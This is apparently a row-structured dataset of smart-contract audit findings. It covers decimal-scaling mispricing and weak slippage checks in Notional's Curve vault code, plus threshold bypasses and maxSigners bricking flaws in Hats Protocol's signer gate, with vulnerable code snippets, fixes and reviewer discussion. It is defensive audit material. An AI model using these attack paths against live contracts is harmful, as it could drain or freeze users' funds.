LP Pool tokens should be worth 100 DAI. However, the `TwoTokenPoolUtils._getTimeWeightedPrimaryBalance` function shows that it is only worth 50.00000000005 DAI, which undervalues the LP Pool tokens.\nIf primary token's decimals (e.g. 6) < secondary token's decimals (e.g. 18)\nTo illustrate the issue, assume the following:\nThe leverage vault supports the DAI-USDC Curve Pool, and its primary token of the vault is USDC.\nUSDC's decimals are 6, while DAI's decimals are 18.\nCurve Pool's total supply is 100\nThe Curve Pool holds 100 USDC and 100 DAI\nFor the sake of simplicity, the price of DAI and USDC is 1:1. Thus, the `oraclePrice` within the function will be `1 * 10^18`. Note that the oracle price is always scaled up to 18 decimals within the vault.\nThe caller of the `TwoTokenPoolUtils._getTimeWeightedPrimaryBalance` function wanted to compute the total value of 50 LP Pool tokens.\n```\nprimaryBalance = poolContext.primaryBalance * poolClaim / totalSupply; // 100 USDC * 50 / 100\nsecondaryBalance = poolContext.secondaryBalance * poolClaim / totalSupply; // 100 DAI * 50 / 100\n```\n\nThe `primaryBalance` will be `50 USDC`. `50 USDC` denominated in WEI will be `50 * 10^6` since the decimals of USDC are 6.\nThe `secondaryBalance` will be `50 DAI`. `50 DAI` denominated in WEI will be `50 * 10^18` since the decimals of DAI are 18.\nNext, the code logic attempts to value the secondary balance (50 DAI) in terms of the primary token (USDC) using the oracle price (1 * 10^18).\n```\nsecondaryAmountInPrimary = secondaryBalance * strategyContext.poolClaimPrecision / oraclePrice;\nsecondaryAmountInPrimary = 50 DAI * 10^18 / (1 * 10^18)\nsecondaryAmountInPrimary = (50 * 10^18) * 10^18 / (1 * 10^18)\nsecondaryAmountInPrimary = 50 * 10^18\n```\n\n50 DAI should be worth 50 USDC (50 * 10^6). However, the `secondaryAmountInPrimary` shows that it is worth 50,000,000,000,000 USDC (50 * 10^18).\n```\nprimaryAmount = (primaryBalance + secondaryAmountInPrimary) * primaryPrecision / strategyContext.poolClaimPrecision;\nprimaryAmount = [(50 * 10^6) + (50 * 10^18)] * 10^6 / 10^18\nprimaryAmount = [(50 * 10^6) + (50 * 10^18)] / 10^12\nprimaryAmount = 50,000,000.00005 = 50 million\n```\n\n50 LP Pool tokens should be worth 100 USDC. However, the `TwoTokenPoolUtils._getTimeWeightedPrimaryBalance` function shows that it is worth 50 million USDC, which overvalues the LP Pool tokens.\nIn summary, if a leverage vault has two tokens with different decimals:\nIf primary token's decimals (e.g. 18) > secondary token's decimals (e.g. 6), then `TwoTokenPoolUtils._getTimeWeightedPrimaryBalance` function will undervalue the LP Pool tokens\nIf primary token's decimals (e.g. 6) < secondary token's decimals (e.g. 18), then `TwoTokenPoolUtils._getTimeWeightedPrimaryBalance` function will overvalue the LP Pool tokensчWhen valuing the secondary balance in terms of the primary token using the oracle price, the result should be scaled up or down the decimals of the primary token accordingly if the decimals of the two tokens are different.\nThe root cause of this issue is in the following portion of the code, which attempts to add the `primaryBalance` and `secondaryAmountInPrimary` before multiplying with the `primaryPrecision`. The `primaryBalance` and `secondaryAmountInPrimary` might not be denominated in the same decimals. Therefore, they cannot be added together without scaling them if the decimals of two tokens are different.\n```\nprimaryAmount = (primaryBalance + secondaryAmountInPrimary) * primaryPrecision / strategyContext.poolClaimPrecision;\n```\n\nConsider implementing the following changes to ensure that the math within the `_getTimeWeightedPrimaryBalance` function work with tokens with different decimals. The below approach will scale the secondary token to match the primary token's precision before performing further computation.\n```\nfunction _getTimeWeightedPrimaryBalance(\n TwoTokenPoolContext memory poolContext,\n StrategyContext memory strategyContext,\n uint256 poolClaim,\n uint256 oraclePrice,\n uint256 spotPrice\n) internal view returns (uint256 primaryAmount) {\n // Make sure spot price is within oracleDeviationLimit of pairPrice\n strategyContext._checkPriceLimit(oraclePrice, spotPrice);\n \n // Get shares of primary and secondary balances with the provided poolClaim\n uint256 totalSupply = poolContext.poolToken.totalSupply();\n uint256 primaryBalance = poolContext.primaryBalance * poolClaim / totalSupply;\n uint256 secondaryBalance = poolContext.secondaryBalance * poolClaim / totalSupply;\n\n// Add the line below\n // Scale secondary balance to primaryPrecision\n// Add the line below\n uint256 primaryPrecision = 10 ** poolContext.primaryDecimals;\n// Add the line below\n uint256 secondaryPrecision = 10 ** poolContext.secondaryDecimals;\n// Add the line below\n secondaryBalance = secondaryBalance * primaryPrecision / secondaryPrecision\n   \n // Value the secondary balance in terms of the primary token using the oraclePairPrice\n uint256 secondaryAmountInPrimary = secondaryBalance * strategyContext.poolClaimPrecision / oraclePrice;\n \n// Remove the line below\n // Make sure primaryAmount is reported in primaryPrecision\n// Remove the line below\n uint256 primaryPrecision = 10 ** poolContext.primaryDecimals;\n// Remove the line below\n primaryAmount = (primaryBalance // Add the line below\n secondaryAmountInPrimary) * primaryPrecision / strategyContext.poolClaimPrecision;\n// Add the line below\n primaryAmount = primaryBalance // Add the line below\n secondaryAmountInPrimary\n}\n```\n\nThe `poolContext.primaryBalance` or `poolClaim` are not scaled up to `strategyContext.poolClaimPrecision`. Thus, the `primaryBalance` is not scaled in any form. Thus, I do not see the need to perform any conversion at the last line of the `_getTimeWeightedPrimaryBalance` function.\n```\nuint256 primaryBalance = poolContext.primaryBalance * poolClaim / totalSupply;\n```\n\nThe following attempts to run through the examples in the previous section showing that the updated function produces valid results after the changes.\nIf primary token's decimals (e.g. 18) > secondary token's decimals (e.g. 6)\n```\nPrimary Balance = 50 DAI (18 Deci), Secondary Balance = 50 USDC (6 Deci)\n\nsecondaryBalance = secondaryBalance * primaryPrecision / secondaryPrecision\nsecondaryBalance = 50 USDC * 10^18 / 10^6\nsecondaryBalance = (50 * 10^6) * 10^18 / 10^6 = (50 * 10^18)\n\nsecondaryAmountInPrimary = secondaryBalance * strategyContext.poolClaimPrecision / oraclePrice;\nsecondaryAmountInPrimary = (50 * 10^18) * 10^18 / (1 * 10^18)\nsecondaryAmountInPrimary = (50 * 10^18) * 10^18 / (1 * 10^18)\nsecondaryAmountInPrimary = 50 * 10^18\n\nprimaryAmount = primaryBalance + secondaryAmountInPrimary\nprimaryAmount = (50 * 10^18) + (50 * 10^18) = (100 * 10^18) = 100 DAI\n```\n\nIf primary token's decimals (e.g. 6) < secondary token's decimals (e.g. 18)\n```\nPrimary Balance = 50 USDC (6 Deci), Secondary Balance = 50 DAI (18 Deci)\n\nsecondaryBalance = secondaryBalance * primaryPrecision / secondaryPrecision\nsecondaryBalance = 50 DAI * 10^6 / 10^18\nsecondaryBalance = (50 * 10^18) * 10^6 / 10^18 = (50 * 10^6)\n\nsecondaryAmountInPrimary = secondaryBalance * strategyContext.poolClaimPrecision / oraclePrice;\nsecondaryAmountInPrimary = (50 * 10^6) * 10^18 / (1 * 10^18)\nsecondaryAmountInPrimary = (50 * 10^6) * 10^18 / (1 * 10^18)\nsecondaryAmountInPrimary = 50 * 10^6\n\nprimaryAmount = primaryBalance + secondaryAmountInPrimary\nprimaryAmount = (50 * 10^6) + (50 * 10^6) = (100 * 10^6) = 100 USDC\n```\n\nIf primary token's decimals (e.g. 6) == secondary token's decimals (e.g. 6)\n```\nPrimary Balance = 50 USDC (6 Deci), Secondary Balance = 50 USDT (6 Deci)\n\nsecondaryBalance = secondaryBalance * primaryPrecision / secondaryPrecision\nsecondaryBalance = 50 USDT * 10^6 / 10^6\nsecondaryBalance = (50 * 10^6) * 10^6 / 10^6 = (50 * 10^6)\n\nsecondaryAmountInPrimary = secondaryBalance * strategyContext.poolClaimPrecision / oraclePrice;\nsecondaryAmountInPrimary = (50 * 10^6) * 10^18 / (1 * 10^18)\nsecondaryAmountInPrimary = (50 * 10^6) * 10^18 / (1 * 10^18)\nsecondaryAmountInPrimary = 50 * 10^6\n\nprimaryAmount = primaryBalance + secondaryAmountInPrimary\nprimaryAmount = (50 * 10^6) + (50 * 10^6) = (100 * 10^6) = 100 USDC\n```\n\n`strategyContext.poolClaimPrecision` set to `CurveConstants.CURVE_PRECISION`, which is `1e18`. `oraclePrice` is always in `1e18` precision.\nDiscussion\njeffywu\nValid, since this is shared code it is better to always scale decimals up to 18 rather than assume that they are. Even if this results in duplicate work for the Balancer strategies.чA vault supporting tokens with two different decimals will undervalue or overvalue the LP Pool tokens.\nThe affected `TwoTokenPoolUtils._getTimeWeightedPrimaryBalance` function is called within the `Curve2TokenPoolUtils._convertStrategyToUnderlying` function that is used for valuing strategy tokens in terms of the primary balance. As a result, the strategy tokens will be overvalued or undervalued\nFollowing are some of the impacts of this issue:\nIf the strategy tokens are overvalued or undervalued, the users might be liquidated prematurely or be able to borrow more than they are allowed to since the `Curve2TokenPoolUtils._convertStrategyToUnderlying` function is indirectly used for computing the collateral ratio of an account within Notional's `VaultConfiguration.calculateCollateralRatio` function.\n`expectedUnderlyingRedeemed` is computed based on the `Curve2TokenPoolUtils._convertStrategyToUnderlying` function. If the `expectedUnderlyingRedeemed` is incorrect, it will break the vault settlement process.\nCode Snippet\nTool used\nManual Review
Ineffective slippage mechanism when redeeming proportionallyчhighч"```\n@external\n@nonreentrant('lock')\ndef remove_liquidity(\n    _amount: uint256,\n    _min_amounts: uint256[N_COINS],\n) -> uint256[N_COINS]:\n    """"""\n    @notice Withdraw coins from the pool\n    @dev Withdrawal amounts are based on current deposit ratios\n    @param _amount Quantity of LP tokens to burn in the withdrawal\n    @param _min_amounts Minimum amounts of underlying coins to receive\n    @return List of amounts of coins that were withdrawn\n    """"""\n    amounts: uint256[N_COINS] = self._balances()\n    lp_token: address = self.lp_token\n    total_supply: uint256 = ERC20(lp_token).totalSupply()\n    CurveToken(lp_token).burnFrom(msg.sender, _amount)  # dev: insufficient funds\n\n    for i in range(N_COINS):\n        value: uint256 = amounts[i] * _amount / total_supply\n        assert value >= _min_amounts[i], ""Withdrawal resulted in fewer coins than expected""\n\n        amounts[i] = value\n        if i == 0:\n            raw_call(msg.sender, b"""", value=value)\n        else:\n            assert ERC20(self.coins[1]).transfer(msg.sender, value)\n\n    log RemoveLiquidity(msg.sender, amounts, empty(uint256[N_COINS]), total_supply - _amount)\n\n    return amounts\n```\n"ч"A trade will continue to be executed regardless of how bad the slippage is since the minimum amount returned by the `TwoTokenPoolUtils._getMinExitAmounts` function does not work effectively. Thus, a trade might incur significant slippage, resulting in the vault receiving fewer tokens in return, leading to losses for the vault shareholders.\nThe `params.minPrimary` and `params.minSecondary` are calculated automatically based on the share of the Curve pool with a small discount within the `Curve2TokenConvexHelper._executeSettlement` function (Refer to Line 124 below)\nWhen LP tokens are redeemed proportionally via the Curve Pool's `remove_liquidity` function, the tokens received are based on the share of the Curve pool as the source code.\n```\n@external\n@nonreentrant('lock')\ndef remove_liquidity(\n    _amount: uint256,\n    _min_amounts: uint256[N_COINS],\n) -> uint256[N_COINS]:\n    """"""\n    @notice Withdraw coins from the pool\n    @dev Withdrawal amounts are based on current deposit ratios\n    @param _amount Quantity of LP tokens to burn in the withdrawal\n    @param _min_amounts Minimum amounts of underlying coins to receive\n    @return List of amounts of coins that were withdrawn\n    """"""\n    amounts: uint256[N_COINS] = self._balances()\n    lp_token: address = self.lp_token\n    total_supply: uint256 = ERC20(lp_token).totalSupply()\n    CurveToken(lp_token).burnFrom(msg.sender, _amount)  # dev: insufficient funds\n\n    for i in range(N_COINS):\n        value: uint256 = amounts[i] * _amount / total_supply\n        assert value >= _min_amounts[i], ""Withdrawal resulted in fewer coins than expected""\n\n        amounts[i] = value\n        if i == 0:\n            raw_call(msg.sender, b"""", value=value)\n        else:\n            assert ERC20(self.coins[1]).transfer(msg.sender, value)\n\n    log RemoveLiquidity(msg.sender, amounts, empty(uint256[N_COINS]), total_supply - _amount)\n\n    return amounts\n```\n\nAssume a Curve Pool with the following state:\nConsists of 200 US Dollars worth of tokens (100 DAI and 100 USDC). DAI is the primary token\nDAI <> USDC price is 1:1\nTotal Supply = 100 LP Pool Tokens\nAssume that 50 LP Pool Tokens will be claimed during vault settlement.\n`TwoTokenPoolUtils._getMinExitAmounts` function will return `49.875 DAI` as `params.minPrimary` and `49.875 USDC` as `params.minSecondary` based on the following calculation\n```\nminPrimary = (poolContext.primaryBalance * poolClaim * strategyContext.vaultSettings.poolSlippageLimitPercent /  (totalPoolSupply * uint256(VaultConstants.VAULT_PERCENT_BASIS)\nminPrimary = (100 DAI * 50 LP_TOKEN * 99.75% /  (100 LP_TOKEN * 100%)\n\nRewrite for clarity (ignoring rounding error):\nminPrimary = 100 DAI * (50 LP_TOKEN/100 LP_TOKEN) * (99.75%/100%) = 49.875 DAI\n\nminSecondary = same calculation = 49.875 USDC\n```\n\nCurve Pool's `remove_liquidity` function will return `50 DAI` and `50 USDC` if 50 LP Pool Tokens are redeemed.\nNote that `TwoTokenPoolUtils._getMinExitAmounts` function performs the calculation based on the spot balance of the pool similar to the approach of the Curve Pool's `remove_liquidity` function. However, the `TwoTokenPoolUtils._getMinExitAmounts` function applied a discount to the returned result, while the Curve Pool's `remove_liquidity` function did not.\nAs such, the number of tokens returned by Curve Pool's `remove_liquidity` function will always be larger than the number of tokens returned by the `TwoTokenPoolUtils._getMinExitAmounts` function regardless of the on-chain economic condition or the pool state (e.g. imbalance). Thus, the minimum amounts (minAmounts) pass into the Curve Pool's `remove_liquidity` function will never be triggered under any circumstance.\n```\na = Curve Pool's remove_liquidity => x DAI\nb = TwoTokenPoolUtils._getMinExitAmounts => (x DAI - 0.25% discount)\na > b => true (for all instances)\n```\n\nThus, the `TwoTokenPoolUtils._getMinExitAmounts` function is not effective in determining the slippage when redeeming proportionally."ч
Users are forced to use the first pool returned by the Curve Registryчmediumч"```\n@view\n@external\ndef find_pool_for_coins(_from: address, _to: address, i: uint256 = 0) -> address:\n    """"""\n    @notice Find an available pool for exchanging two coins\n    @param _from Address of coin to be sent\n    @param _to Address of coin to be received\n    @param i Index value. When multiple pools are available\n            this value is used to return the n'th address.\n    @return Pool address\n    """"""\n    key: uint256 = bitwise_xor(convert(_from, uint256), convert(_to, uint256))\n    return self.markets[key][i]\n```\n"ч"If multiple pools support the exchange, users are forced to use the first pool returned by the Curve Registry. The first pool returned by Curve Registry might not be the most optimal pool to trade with. The first pool might have lesser liquidity, larger slippage, and higher fee than the other pools, resulting in the trade returning lesser assets than expected.\nWhen performing a trade via the `CurveAdapter._exactInSingle` function, it will call the `CURVE_REGISTRY.find_pool_for_coins` function to find the available pools for exchanging two coins.\nHowever, it was observed that when multiple pools are available, users can choose the pool to return by defining the `i` parameter of the `find_pool_for_coins` function as shown below.\nhttps://etherscan.io/address/0x90E00ACe148ca3b23Ac1bC8C240C2a7Dd9c2d7f5#code\n```\n@view\n@external\ndef find_pool_for_coins(_from: address, _to: address, i: uint256 = 0) -> address:\n    """"""\n    @notice Find an available pool for exchanging two coins\n    @param _from Address of coin to be sent\n    @param _to Address of coin to be received\n    @param i Index value. When multiple pools are available\n            this value is used to return the n'th address.\n    @return Pool address\n    """"""\n    key: uint256 = bitwise_xor(convert(_from, uint256), convert(_to, uint256))\n    return self.markets[key][i]\n```\n\nHowever, the `CurveAdapter._exactInSingle` did not allow users to define the `i` parameter of the `find_pool_for_coins` function. As a result, users are forced to trade against the first pool returned by the Curve Registry."чIf multiple pools support the exchange, consider allowing the users to choose which pool they want to trade against.\n```\nfunction _exactInSingle(Trade memory trade)\n internal view returns (address target, bytes memory executionCallData)\n{\n address sellToken = _getTokenAddress(trade.sellToken);\n address buyToken = _getTokenAddress(trade.buyToken);\n// Remove the line below\n ICurvePool pool = ICurvePool(Deployments.CURVE_REGISTRY.find_pool_for_coins(sellToken, buyToken));\n// Add the line below\n ICurvePool pool = ICurvePool(Deployments.CURVE_REGISTRY.find_pool_for_coins(sellToken, buyToken, trade.pool_index)); \n```\n\nDiscussion\njeffywu\nValid\nhrishibhat\nGiven that this is only a possibility and all the conditions for loss of funds are not guaranteed, Considering this issue as a valid mediumчThe first pool returned by Curve Registry might not be the most optimal pool to trade with. The first pool might have lesser liquidity, larger slippage, and higher fee than the other pools, resulting in the trade returning lesser assets than expected.\nCode Snippet\nTool used\nManual Review
Signers can bypass checks and change threshold within a transactionчhighч```\nif (safe.getThreshold() != _getCorrectThreshold()) {\n    revert SignersCannotChangeThreshold();\n}\n```\nчThe `checkAfterExecution()` function has checks to ensure that the safe's threshold isn't changed by a transaction executed by signers. However, the parameters used by the check can be changed midflight so that this crucial restriction is violated.\nThe `checkAfterExecution()` is intended to uphold important invariants after each signer transaction is completed. This is intended to restrict certain dangerous signer behaviors. From the docs:\n/// @notice Post-flight check to prevent `safe` signers from removing this contract guard, changing any modules, or changing the threshold\nHowever, the restriction that the signers cannot change the threshold can be violated.\nTo see how this is possible, let's check how this invariant is upheld. The following check is performed within the function:\n```\nif (safe.getThreshold() != _getCorrectThreshold()) {\n    revert SignersCannotChangeThreshold();\n}\n```\n\nIf we look up `_getCorrectThreshold()`, we see the following:\n```\nfunction _getCorrectThreshold() internal view returns (uint256 _threshold) {\n    uint256 count = _countValidSigners(safe.getOwners());\n    uint256 min = minThreshold;\n    uint256 max = targetThreshold;\n    if (count < min) _threshold = min;\n    else if (count > max) _threshold = max;\n    else _threshold = count;\n}\n```\n\nAs we can see, this means that the safe's threshold after the transaction must equal the valid signers, bounded by the `minThreshold` and `maxThreshold`.\nHowever, this check does not ensure that the value returned by `_getCorrectThreshold()` is the same before and after the transaction. As a result, as long as the number of owners is also changed in the transaction, the condition can be upheld.\nTo illustrate, let's look at an example:\nBefore the transaction, there are 8 owners on the vault, all signers. targetThreshold == 10 and minThreshold == 2, so the safe's threshold is 8 and everything is good.\nThe transaction calls `removeOwner()`, removing an owner from the safe and adjusting the threshold down to 7.\nAfter the transaction, there will be 7 owners on the vault, all signers, the safe's threshold will be 7, and the check will pass.\nThis simple example focuses on using `removeOwner()` once to decrease the threshold. However, it is also possible to use the safe's multicall functionality to call `removeOwner()` multiple times, changing the threshold more dramatically.ч"Save the safe's current threshold in `checkTransaction()` before the transaction has executed, and compare the value after the transaction to that value from storage.\nDiscussion\nspengrah\nIn one sense, this is sort of ok since we're still always ensuring that the threshold is ""correct"" based on the number of valid signers on the safe, and changing the threshold doesn't allow . If a valid signer is removed by a safe tx, they can re-claim and then everything is back to the way it was.\nBut in another sense, it does make it fairly difficult to conceptualize the system, and it would also be ideal to successfully follow the documentation 😉. In all, I think this is more of a medium severity.\nThe suggested solution should work, but likely isn't needed if we're also storing/comparing the full owner array in order to address #118 and #70.\ncc @zobront\nspengrah\nWithdrawing the severity dispute since it would be quite painful if the signers continuously replaced existing signers to reach max signers, which could prevent replaced signers from reclaiming.\nspengrah\nhttps://github.com/Hats-Protocol/hats-zodiac/pull/5"чSigners can change the threshold of the vault, giving themselves increased control over future transactions and breaking an important trust assumption of the protocol.\nCode Snippet\nTool used\nManual Review
HatsSignerGate + MultiHatsSignerGate: more than maxSignatures can be claimed which leads to DOS in reconcileSignerCountчhighч```\n        // 9 >= 10 is false\n        if (currentSignerCount >= maxSigs) {\n            revert MaxSignersReached();\n        }\n\n        // msg.sender is a new signer so he is not yet owner\n        if (safe.isOwner(msg.sender)) {\n            revert SignerAlreadyClaimed(msg.sender);\n        }\n\n        // msg.sender is a valid signer, he wears the signer hat\n        if (!isValidSigner(msg.sender)) {\n            revert NotSignerHatWearer(msg.sender);\n        }\n```\nчThe `HatsSignerGate.claimSigner` and `MultiHatsSignerGate.claimSigner` functions allow users to become signers.\nIt is important that both functions do not allow that there exist more valid signers than `maxSigners`.\nThis is because if there are more valid signers than `maxSigners`, any call to `HatsSignerGateBase.reconcileSignerCount` reverts, which means that no transactions can be executed.\nThe only possibility to resolve this is for a valid signer to give up his signer hat. No signer will voluntarily give up his signer hat. And it is wrong that a signer must give it up. Valid signers that have claimed before `maxSigners` was reached should not be affected by someone trying to become a signer and exceeding `maxSigners`. In other words the situation where one of the signers needs to give up his signer hat should have never occurred in the first place.\nThink of the following scenario:\n`maxSignatures=10` and there are 10 valid signers\nThe signers execute a transaction that calls `Safe.addOwnerWithThreshold` such that there are now 11 owners (still there are 10 valid signers)\nOne of the 10 signers is no longer a wearer of the hat and `reconcileSignerCount` is called. So there are now 9 valid signers and 11 owners\nThe signer that was no longer a wearer of the hat in the previous step now wears the hat again. However `reconcileSignerCount` is not called. So there are 11 owners and 10 valid signers. The HSG however still thinks there are 9 valid signers.\nWhen a new signer now calls `claimSigner`, all checks will pass and he will be swapped for the owner that is not a valid signer:\n```\n        // 9 >= 10 is false\n        if (currentSignerCount >= maxSigs) {\n            revert MaxSignersReached();\n        }\n\n        // msg.sender is a new signer so he is not yet owner\n        if (safe.isOwner(msg.sender)) {\n            revert SignerAlreadyClaimed(msg.sender);\n        }\n\n        // msg.sender is a valid signer, he wears the signer hat\n        if (!isValidSigner(msg.sender)) {\n            revert NotSignerHatWearer(msg.sender);\n        }\n```\n\nSo there are now 11 owners and 11 valid signers. This means when `reconcileSignerCount` is called, the following lines cause a revert:\n```\n    function reconcileSignerCount() public {\n        address[] memory owners = safe.getOwners();\n        uint256 validSignerCount = _countValidSigners(owners);\n\n        // 11 > 10\n        if (validSignerCount > maxSigners) {\n            revert MaxSignersReached();\n        }\n```\nчThe `HatsSignerGate.claimSigner` and `MultiHatsSignerGate.claimSigner` functions should call `reconcileSignerCount` such that they work with the correct amount of signers and the scenario described in this report cannot occur.\nDiscussion\nspengrah\nI don't believe this is a duplicate of #46, which deals with number of owners being increased by another module, while the present issue deals with owners being increased by the safe's signers. That means, however, that it be a duplicate of #118 and #170.ч"As mentioned before, we end up in a situation where one of the valid signers has to give up his signer hat in order for the HSG to become operable again.\nSo one of the valid signers that has rightfully claimed his spot as a signer may lose his privilege to sign transactions.\nCode Snippet\n```\n    function claimSigner() public virtual {\n        uint256 maxSigs = maxSigners; // save SLOADs\n        uint256 currentSignerCount = signerCount;\n\n\n        if (currentSignerCount >= maxSigs) {\n            revert MaxSignersReached();\n        }\n\n\n        if (safe.isOwner(msg.sender)) {\n            revert SignerAlreadyClaimed(msg.sender);\n        }\n\n\n        if (!isValidSigner(msg.sender)) {\n            revert NotSignerHatWearer(msg.sender);\n        }\n\n\n        /* \n        We check the safe owner count in case there are existing owners who are no longer valid signers. \n        If we're already at maxSigners, we'll replace one of the invalid owners by swapping the signer.\n        Otherwise, we'll simply add the new signer.\n        */\n        address[] memory owners = safe.getOwners();\n        uint256 ownerCount = owners.length;\n\n\n        if (ownerCount >= maxSigs) {\n            bool swapped = _swapSigner(owners, ownerCount, maxSigs, currentSignerCount, msg.sender);\n            if (!swapped) {\n                // if there are no invalid owners, we can't add a new signer, so we revert\n                revert NoInvalidSignersToReplace();\n            }\n        } else {\n            _grantSigner(owners, currentSignerCount, msg.sender);\n        }\n    }\n```\n\n```\n    function claimSigner(uint256 _hatId) public {\n        uint256 maxSigs = maxSigners; // save SLOADs\n        uint256 currentSignerCount = signerCount;\n\n\n        if (currentSignerCount >= maxSigs) {\n            revert MaxSignersReached();\n        }\n\n\n        if (safe.isOwner(msg.sender)) {\n            revert SignerAlreadyClaimed(msg.sender);\n        }\n\n\n        if (!isValidSignerHat(_hatId)) {\n            revert InvalidSignerHat(_hatId);\n        }\n\n\n        if (!HATS.isWearerOfHat(msg.sender, _hatId)) {\n            revert NotSignerHatWearer(msg.sender);\n        }\n\n\n        /* \n        We check the safe owner count in case there are existing owners who are no longer valid signers. \n        If we're already at maxSigners, we'll replace one of the invalid owners by swapping the signer.\n        Otherwise, we'll simply add the new signer.\n        */\n        address[] memory owners = safe.getOwners();\n        uint256 ownerCount = owners.length;\n\n\n        if (ownerCount >= maxSigs) {\n            bool swapped = _swapSigner(owners, ownerCount, maxSigs, currentSignerCount, msg.sender);\n            if (!swapped) {\n                // if there are no invalid owners, we can't add a new signer, so we revert\n                revert NoInvalidSignersToReplace();\n            }\n        } else {\n            _grantSigner(owners, currentSignerCount, msg.sender);\n        }\n\n\n        // register the hat used to claim. This will be the hat checked in `checkTransaction()` for this signer\n        claimedSignerHats[msg.sender] = _hatId;\n    }\n```\n\n```\n    function reconcileSignerCount() public {\n        address[] memory owners = safe.getOwners();\n        uint256 validSignerCount = _countValidSigners(owners);\n\n\n        if (validSignerCount > maxSigners) {\n            revert MaxSignersReached();\n        }\n\n\n        // update the signer count accordingly\n        signerCount = validSignerCount;\n\n\n        uint256 currentThreshold = safe.getThreshold();\n        uint256 newThreshold;\n        uint256 target = targetThreshold; // save SLOADs\n\n\n        if (validSignerCount <= target && validSignerCount != currentThreshold) {\n            newThreshold = validSignerCount;\n        } else if (validSignerCount > target && currentThreshold < target) {\n            newThreshold = target;\n        }\n        if (newThreshold > 0) {\n            bytes memory data = abi.encodeWithSignature(""changeThreshold(uint256)"", validSignerCount);\n\n\n            bool success = safe.execTransactionFromModule(\n                address(safe), // to\n                0, // value\n                data, // data\n                Enum.Operation.Call // operation\n            );\n\n\n            if (!success) {\n                revert FailedExecChangeThreshold();\n            }\n        }\n    }\n```\n\nTool used\nManual Review"
Signers can brick safe by adding unlimited additional signers while avoiding checksчhighч```\nif (safe.getThreshold() != _getCorrectThreshold()) {\n    revert SignersCannotChangeThreshold();\n}\n\nfunction _getCorrectThreshold() internal view returns (uint256 _threshold) {\n    uint256 count = _countValidSigners(safe.getOwners());\n    uint256 min = minThreshold;\n    uint256 max = targetThreshold;\n    if (count < min) _threshold = min;\n    else if (count > max) _threshold = max;\n    else _threshold = count;\n}\n```\nчThere are a number of checks in `checkAfterExecution()` to ensure that the signers cannot perform any illegal actions to exert too much control over the safe. However, there is no check to ensure that additional owners are not added to the safe. This could be done in a way that pushes the total over `maxSigners`, which will cause all future transactions to revert.\nThis means that signers can easily collude to freeze the contract, giving themselves the power to hold the protocol ransom to unfreeze the safe and all funds inside it.\nWhen new owners are added to the contract through the `claimSigner()` function, the total number of owners is compared to `maxSigners` to ensure it doesn't exceed it.\nHowever, owners can also be added by a normal `execTransaction` function. In this case, there are very few checks (all of which could easily or accidentally be missed) to stop us from adding too many owners:\n```\nif (safe.getThreshold() != _getCorrectThreshold()) {\n    revert SignersCannotChangeThreshold();\n}\n\nfunction _getCorrectThreshold() internal view returns (uint256 _threshold) {\n    uint256 count = _countValidSigners(safe.getOwners());\n    uint256 min = minThreshold;\n    uint256 max = targetThreshold;\n    if (count < min) _threshold = min;\n    else if (count > max) _threshold = max;\n    else _threshold = count;\n}\n```\n\nThat means that either in the case that (a) the safe's threshold is already at `targetThreshold` or (b) the owners being added are currently toggled off or have eligibility turned off, this check will pass and the owners will be added.\nOnce they are added, all future transactions will fail. Each time a transaction is processed, `checkTransaction()` is called, which calls `reconcileSignerCount()`, which has the following check:\n```\nif (validSignerCount > maxSigners) {\n    revert MaxSignersReached();\n}\n```\n\nThis will revert as long as the new owners are now activated as valid signers.\nIn the worst case scenario, valid signers wearing an immutable hat are added as owners when the safe's threshold is already above `targetThreshold`. The check passes, but the new owners are already valid signers. There is no admin action that can revoke the validity of their hats, so the `reconcileSignerCount()` function will always revert, and therefore the safe is unusable.\nSince `maxSigners` is immutable and can't be changed, the only solution is for the hat wearers to renounce their hats. Otherwise, the safe will remain unusable with all funds trapped inside.ч
Other module can add owners to safe that push us above maxSigners, bricking safeчhighч```\nif (validSignerCount > maxSigners) {\n    revert MaxSignersReached();\n}\n```\nчIf another module adds owners to the safe, these additions are not checked by our module or guard's logic. This can result in pushing us over `maxSigners`, which will cause all transactions to revert. In the case of an immutable hat, the only way to avoid the safe being locked permanently (with all funds frozen) may be to convince many hat wearers to renounce their hats.\nWhen new owners are added to the contract through the `claimSigner()` function, the total number of owners is compared to `maxSigners` to ensure it doesn't exceed it.\nHowever, if there are other modules on the safe, they are able to add additional owners without these checks.\nThis could lead to an issue where many (more than maxSigners) wearers of an immutable hat are added to the safe as owners. Now, each time a transaction is processed, `checkTransaction()` is called, which calls `reconcileSignerCount()`, which has the following check:\n```\nif (validSignerCount > maxSigners) {\n    revert MaxSignersReached();\n}\n```\n\nThis will revert.\nWorse, there is nothing the admin can do about it. If they don't have control over the eligibility address for the hat, they are not able to burn the hats or transfer them.\nThe safe will be permanently bricked and unable to perform transactions unless the hat wearers agree to renounce their hats.чIf `validSignerCount > maxSigners`, there should be some mechanism to reduce the number of signers rather than reverting.\nAlternatively, as suggested in another issue, to get rid of all the potential risks of having other modules able to make changes outside of your module's logic, we should create the limit that the HatsSignerGate module can only exist on a safe with no other modules.\nDiscussion\nspengrah\nI can see a few approaches here\nAdd an onlyOwner function to change `maxSigners`. This opens up more surface area, but would enable the owner to unbrick the safe in this case.\nAdd (and document) a trust assumption that other modules either a) will not add new safe owners, or b) can remove them if they accidentally brick the safe\nblock any modules aside from HSG\ncc @zobront\nzobront\n@spengrah I believe that allowing other modules aside from HSG adds a huge risk surface and is better not to. I know there are trade offs, but even if you manage to get everything right, you know there will be mistakes that lead to exploits, and in my view the best thing you can do for users is not allow it.\nspengrah\nhttps://github.com/Hats-Protocol/hats-zodiac/pull/10\nzobront\nEscalate for 10 USDC\nAll three dups of this issue (#51, #104, #130) describe the same issue, in which more than `maxSigners` can be added by (a) removing a hat, (b) reconciling, and (c) adding the hat back. This is a valid attack path.\nThis issue describes a separate issue, in which the extra signer can be added by an external module, which is a totally different attack with a different solution (note: @spengrah please make sure to review the other issues to ensure you have a fix that accounts for them).\nThis issue should be deduplicated from the other 3, since the attack is totally unrelated and simply results in the same outcome.\nsherlock-admin\nEscalate for 10 USDC\nAll three dups of this issue (#51, #104, #130) describe the same issue, in which more than `maxSigners` can be added by (a) removing a hat, (b) reconciling, and (c) adding the hat back. This is a valid attack path.\nThis issue describes a separate issue, in which the extra signer can be added by an external module, which is a totally different attack with a different solution (note: @spengrah please make sure to review the other issues to ensure you have a fix that accounts for them).\nThis issue should be deduplicated from the other 3, since the attack is totally unrelated and simply results in the same outcome.\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window 